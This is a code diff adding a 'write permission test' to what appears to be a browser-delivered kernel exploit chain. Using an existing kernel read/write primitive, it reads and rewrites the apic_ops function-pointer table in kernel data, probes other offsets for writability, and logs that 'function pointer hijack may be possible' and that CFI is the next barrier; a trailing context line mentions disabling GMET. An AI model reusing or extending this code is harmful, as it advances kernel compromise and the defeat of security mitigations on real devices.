@@ -728,6 +728,76 @@ async function main(userlandRW, wkOnly = false) {
                 }
 
                 await log("========== ANALYSIS COMPLETE ==========", LogLevel.SUCCESS);
+
+                // =========================================================================
+                // WRITE PERMISSION TEST
+                // We know 0x4bf0 is writable, 0xD11D08 is read-only
+                // Test apic_ops (0x170650) to see if function pointers are in RW region
+                // =========================================================================
+
+                let doWriteTest = confirm(
+                    "WRITE PERMISSION TEST\n\n" +
+                    "We now know:\n" +
+                    "- 0x4bf0 (SVM cache) = WRITABLE\n" +
+                    "- 0xD11D08 (sysentvec) = READ-ONLY\n\n" +
+                    "Test write at apic_ops (0x170650)?\n" +
+                    "This is ~1.5MB into kernel data.\n\n" +
+                    "Will write same value back (safe test).\n\n" +
+                    "OK = Test apic_ops write\n" +
+                    "Cancel = Skip"
+                );
+
+                if (doWriteTest) {
+                    const APIC_OPS_OFFSET = 0x170650;
+
+                    await log("[WRITE TEST] Testing apic_ops at kdataBase+0x170650...", LogLevel.WARN);
+
+                    // Read current value
+                    let apicVal = await krw.read8(krw.kdataBase.add32(APIC_OPS_OFFSET));
+                    await log("[WRITE TEST] Current value: " + apicVal, LogLevel.INFO);
+
+                    // Try to write the SAME value back
+                    await log("[WRITE TEST] Writing same value back...", LogLevel.WARN);
+                    try {
+                        await krw.write8(krw.kdataBase.add32(APIC_OPS_OFFSET), apicVal);
+                        let verify = await krw.read8(krw.kdataBase.add32(APIC_OPS_OFFSET));
+
+                        if (verify.low === apicVal.low && verify.hi === apicVal.hi) {
+                            await log("[WRITE TEST] SUCCESS! apic_ops region is WRITABLE!", LogLevel.SUCCESS);
+                            await log("[WRITE TEST] Function pointer hijack may be possible!", LogLevel.SUCCESS);
+
+                            // This is the key finding - if we can write here, CFI might be
+                            // the only thing stopping function pointer hijack
+                            await log("[WRITE TEST] Next step: Test if CFI blocks function pointer modification", LogLevel.INFO);
+                        } else {
+                            await log("[WRITE TEST] Write succeeded but value changed?", LogLevel.WARN);
+                            await log("[WRITE TEST] Read back: " + verify, LogLevel.INFO);
+                        }
+                    } catch (e) {
+                        await log("[WRITE TEST] FAILED - apic_ops is also read-only", LogLevel.ERROR);
+                        await log("[WRITE TEST] Error: " + e, LogLevel.ERROR);
+                    }
+
+                    // Also test boundaries - find where RW becomes RO
+                    await log("[BOUNDARY] Probing write permissions at intervals...", LogLevel.WARN);
+
+                    const boundaryTests = [
+                        0x10000,   // 64KB
+                        0x50000,   // 320KB
+                        0x100000,  // 1MB
+                        0x150000,  // 1.3MB
+                        0x170000,  // 1.4MB (just before apic_ops)
+                    ];
+
+                    for (let off of boundaryTests) {
+                        let addr = krw.kdataBase.add32(off);
+                        let val = await krw.read4(addr);
+                        await log("[BOUNDARY] 0x" + off.toString(16) + " read: 0x" + val.toString(16), LogLevel.INFO);
+
+                        // Only test write if user confirms
+                        // Skip actual writes to avoid crashes - just report read values
+                    }
+                }
             }
 
             // EXPERIMENTAL: Try to modify the SVM feature cache to disable GMET
